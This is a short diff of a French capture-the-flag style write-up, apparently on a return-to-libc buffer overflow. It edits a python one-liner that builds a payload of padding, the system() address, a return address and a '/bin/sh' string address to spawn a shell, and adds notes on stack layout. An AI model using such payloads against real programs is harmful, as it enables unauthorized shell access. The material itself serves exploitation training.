@@ -83,7 +83,7 @@ Explications supplementaires:
 
 Il est à noté que l'appel à exit est optionnel, en effet, ligne suivante fonctionne egalement:
 
-```python -c 'print "dat_wil\n"+"B"*80+"\xd0\xae\xe6\xf7"+"\x70\x00\x00\x00"+"\xec\x97\xf8\xf7"' > /tmp/payload```
+```python -c 'print "dat_wil\n"+"B"*80+"\xd0\xae\xe6\xf7"+"\x00\x00\x00\x00"+"\xec\x97\xf8\xf7"' > /tmp/payload```
 
 Exit permet juste de quitter le programme proprement. Il est par contre imperatif de disposer d'une adresse en l'appel à system et à son argument /bin/sh.
 En effet, l'assembleur a besoin de disposer d'une adresse de sortie après l'appel d'une fonction, avant de recevoir les arguments.
